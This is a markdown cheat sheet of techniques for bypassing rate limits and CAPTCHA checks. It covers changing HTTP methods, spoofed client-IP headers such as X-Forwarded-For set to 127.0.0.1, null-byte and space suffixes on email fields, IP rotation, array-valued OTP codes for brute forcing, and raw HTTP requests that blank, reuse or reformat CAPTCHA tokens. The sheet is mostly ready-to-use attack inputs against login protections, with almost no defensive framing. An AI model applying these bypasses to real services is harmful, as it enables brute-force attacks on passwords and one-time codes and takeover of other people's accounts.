#  Rate Limit

## 1 HTTP Methods
    If the request goes on GET try to change it to POST, PUT, etc.,
    If you wanna bypass the rate-limit in API's try HEAD method.
    
    
## 2 Add some custom header
```
X-Forwarded-For : 127.0.0.1
X-Host : 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP : 127.0.0.1
X-Remote-IP : 127.0.0.1
X-Remote-Addr : 127.0.0.1 
X-Custom-IP-Authorization: 127.0.0.1

#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

## 3.Using Special Characters
  ```  
    Adding Null Byte ( %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C) at the end of the Email email=victim@gmail.com%00
    Try adding a Space Character after a Email. ( Not Encoded ) {"email":"victim@gmail.com "}
    Adding a slash(/) at the end of api endpoint can also Bypass Rate Limit. domain.com/v1/login -> domain.com/v1/login/
```


## 4. Using IP Rotate Burp Extension

    Try changing the user-agent, the cookies... anything that could be able to identify you
    If they are limiting to 10 tries per IP, every 10 tries change the IP inside the header.
    
    
## 5 Multiple values in request

    When brute-force, try passing several values in one request at once, for instance:
    phone=+17342239011&code[]=123456&code[]=654321&...&code[]=331337
    
## 6 Use different params: 
    sign-up, Sign-up, SignUp
    
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Captcha
## Changing the request method, 

## Custom header 
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
## Remove the value of the captcha parameter
```
POST / HTTP 1.1
Host: target.com
[...]
_RequestVerificationToken=&_Username=daffa&_Password=test123
```

## Try reuse old captcha token
```
POST / HTTP 1.1
Host: target.com
[...]
_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```

## Convert JSON data to normal request parameter
```
POST / HTTP 1.1
Host: target.com
[...]
{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

    
    
    
    
    
    


